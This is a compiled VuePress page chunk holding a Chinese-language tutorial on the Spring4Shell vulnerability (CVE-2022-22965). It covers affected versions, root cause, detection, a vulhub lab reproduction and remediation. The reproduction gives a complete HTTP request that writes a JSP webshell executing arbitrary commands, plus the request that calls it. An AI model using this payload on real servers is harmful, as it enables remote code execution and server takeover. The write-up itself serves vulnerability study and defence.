import{_ as a,W as s,X as n,a1 as e}from"./framework-b6a07282.js";const t="/assets/1-7c71099d.png",i="/assets/2-02ca22d9.png",p="/assets/3-6c77f630.png",l={},r=e(`<h2 id="spring-framework-rce漏洞" tabindex="-1"><a class="header-anchor" href="#spring-framework-rce漏洞" aria-hidden="true">#</a> Spring Framework RCE漏洞</h2><h3 id="_1-该漏洞是什么" tabindex="-1"><a class="header-anchor" href="#_1-该漏洞是什么" aria-hidden="true">#</a> 1.该漏洞是什么？</h3><ul><li>Spring Framework RCE漏洞（CVE-2022-22965）是一个影响JDK9及以上运行的Spring MVC或Spring WebFlux应用程序的远程代码执行（RCE）漏洞。它利用了JDK9+中的参数绑定功能。这个漏洞可导致攻击者在服务器上写入webshell并执行进一步的命令。</li></ul><h4 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h4><ul><li>运行环境为JDK9及以上版本的：</li><li>Spring Framework 5.3.0-5.3.17</li><li>Spring Framework 5.2.0-5.2.19</li><li>Spring Framework 5.1.0-5.1.23</li><li>Spring Framework 5.0.0-5.0.22</li><li>Spring Framework 4.3.0-4.3.32</li><li>以及其它旧版的、不受支持的版本</li><li>Web应用部署方式必须为Tomcat war包部署（jar的形式则不行）</li></ul><h3 id="_2-漏洞的发生原因是什么" tabindex="-1"><a class="header-anchor" href="#_2-漏洞的发生原因是什么" aria-hidden="true">#</a> 2.漏洞的发生原因是什么？</h3><ul><li>这个漏洞的原因是Spring Framework在JDK9+中使用了一个不安全的参数绑定机制，攻击者通过利用SpringMVC的参数绑定控制Tomcat的AccesslogValue的属性，AccesslogValue属性可修改文件、文件名、保存路径。如果没有对http请求参数进行有效的验证和过滤，攻击者可通过构造恶意的HTTP请求来写入webshell，执行任意代码。</li><li>这个漏洞需要应用程序在Tomcat上以WAR部署的方式运行，如果应用程序是以jar的方式部署，就不受影响。</li></ul><h3 id="_3-如何发现是否存在这个漏洞" tabindex="-1"><a class="header-anchor" href="#_3-如何发现是否存在这个漏洞" aria-hidden="true">#</a> 3.如何发现是否存在这个漏洞？</h3><ol><li>版本检查</li><li>查看日志是否存在包含<code>module.classLoader</code>参数的请求</li></ol><h3 id="_4-该漏洞会造成什么危害" tabindex="-1"><a class="header-anchor" href="#_4-该漏洞会造成什么危害" aria-hidden="true">#</a> 4.该漏洞会造成什么危害？</h3><ul><li>在服务写入webshell，导致远程代码执行（RCE）。</li></ul><h3 id="_5-如何利用这个漏洞" tabindex="-1"><a class="header-anchor" href="#_5-如何利用这个漏洞" aria-hidden="true">#</a> 5.如何利用这个漏洞？</h3><h3 id="cve-2022-22965漏洞复现" tabindex="-1"><a class="header-anchor" href="#cve-2022-22965漏洞复现" aria-hidden="true">#</a> CVE-2022-22965漏洞复现</h3><h4 id="vulhub漏洞复现" tabindex="-1"><a class="header-anchor" href="#vulhub漏洞复现" aria-hidden="true">#</a> vulhub漏洞复现</h4><h5 id="使用exploit-py进行攻击" tabindex="-1"><a class="header-anchor" href="#使用exploit-py进行攻击" aria-hidden="true">#</a> 使用exploit.py进行攻击</h5><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>1.使用expolit.py进行攻击
python .\\exploit.py --url http://192.168.1.130:8080/参数
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="构造http请求写入一句话木马" tabindex="-1"><a class="header-anchor" href="#构造http请求写入一句话木马" aria-hidden="true">#</a> 构造HTTP请求写入一句话木马</h5><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>POC：
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern<span class="token operator">=</span>%25%7Bc2%7Di%20if<span class="token punctuation">(</span>%22j%22.equals<span class="token punctuation">(</span>request.getParameter<span class="token punctuation">(</span>%22pwd%22<span class="token punctuation">))</span><span class="token punctuation">)</span>%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span>request.getParameter<span class="token punctuation">(</span>%22cmd%22<span class="token punctuation">))</span>.getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span>%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while<span class="token variable"><span class="token punctuation">((</span>a<span class="token operator">%</span><span class="token number">3</span>Din.read<span class="token punctuation">(</span>b<span class="token punctuation">))</span></span><span class="token operator">!</span>%3D-1<span class="token punctuation">)</span>%7B%20out.println<span class="token punctuation">(</span>new%20String<span class="token punctuation">(</span>b<span class="token punctuation">))</span>%3B%20%7D%20%7D%20%25%7Bsuffix%7Di<span class="token operator">&amp;</span><span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.suffix</span><span class="token operator">=</span>.jsp<span class="token operator">&amp;</span><span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.directory</span><span class="token operator">=</span>webapps/ROOT<span class="token operator">&amp;</span><span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.prefix</span><span class="token operator">=</span>muma<span class="token operator">&amp;</span><span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</span><span class="token operator">=</span> HTTP/1.1


suffix: %<span class="token operator">&gt;</span>//
c1: Runtime
c2: <span class="token operator">&lt;</span>%
DNT: <span class="token number">1</span>

解析：
GET /?
<span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.pattern</span><span class="token operator">=</span>%25%7Bc2%7Di%20if<span class="token punctuation">(</span>%22j%22.equals<span class="token punctuation">(</span>request.getParameter<span class="token punctuation">(</span>%22pwd%22<span class="token punctuation">))</span><span class="token punctuation">)</span>%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span>request.getParameter<span class="token punctuation">(</span>%22cmd%22<span class="token punctuation">))</span>.getInputStream<span class="token punctuation">(</span><span class="token punctuation">)</span>%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while<span class="token variable"><span class="token punctuation">((</span>a<span class="token operator">%</span><span class="token number">3</span>Din.read<span class="token punctuation">(</span>b<span class="token punctuation">))</span></span><span class="token operator">!</span>%3D-1<span class="token punctuation">)</span>%7B%20out.println<span class="token punctuation">(</span>new%20String<span class="token punctuation">(</span>b<span class="token punctuation">))</span>%3B%20%7D%20%7D%20%25%7Bsuffix%7Di<span class="token operator">&amp;</span> <span class="token comment">#文件内容，为一句话木马</span>

<span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.suffix</span><span class="token operator">=</span>.jsp<span class="token operator">&amp;</span> <span class="token comment">#文件名后缀</span>

<span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.directory</span><span class="token operator">=</span>webapps/ROOT<span class="token operator">&amp;</span> <span class="token comment">#该一句话木马存放文件路径</span>

<span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.prefix</span><span class="token operator">=</span>muma<span class="token operator">&amp;</span> <span class="token comment">#文件名前缀</span>

<span class="token assign-left variable">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</span><span class="token operator">=</span> <span class="token comment">#文件名日期后缀</span>
 
HTTP/1.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol><li>抓包，将这两处复制进去。</li></ol><img src="`+t+`"><ol start="2"><li>访问一句话木马</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>http://192.168.1.130:8080/muma.jsp?pwd<span class="token operator">=</span>j<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span>pwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+i+`"><ol start="3"><li>进入被攻击机，发现写入的木马文件</li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker</span> <span class="token builtin class-name">exec</span> <span class="token parameter variable">-it</span> 26f16fba7a80   /bin/bash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><img src="`+p+'"><h3 id="_6-如何修复-防御这个漏洞" tabindex="-1"><a class="header-anchor" href="#_6-如何修复-防御这个漏洞" aria-hidden="true">#</a> 6.如何修复/防御这个漏洞？</h3><ul><li><p>升级Spring Framework 5.3.18或5.2.20</p></li><li><p>安装安全产品，如WAF</p></li></ul><p>如果Spring Framework无法升级尝试：</p><ul><li><p>在Tomcat中禁用<code>allowCasualMultipartParsing</code>属性，或者使用最新版本的Tomcat（8.5.78, 9.0.62, 10.0.20, 10.1.0-M14。</p></li><li><p>在Spring MVC或Spring WebFlux中使用<code>@RequestBody</code>注解来接收HTTP请求参数，而不是直接使用POJO参数。</p></li><li><p>在Spring MVC或Spring WebFlux中使用自定义的数据绑定规则，来过滤掉以<code>module.</code>开头的参数名。</p></li></ul><h3 id="_7-在有防御措施的情况下-如何绕过防御" tabindex="-1"><a class="header-anchor" href="#_7-在有防御措施的情况下-如何绕过防御" aria-hidden="true">#</a> 7.在有防御措施的情况下，如何绕过防御？</h3>',31),o=[r];function c(u,d){return s(),n("div",null,o)}const h=a(l,[["render",c],["__file","Spring Framework RCE漏洞.html.vue"]]);export{h as default};
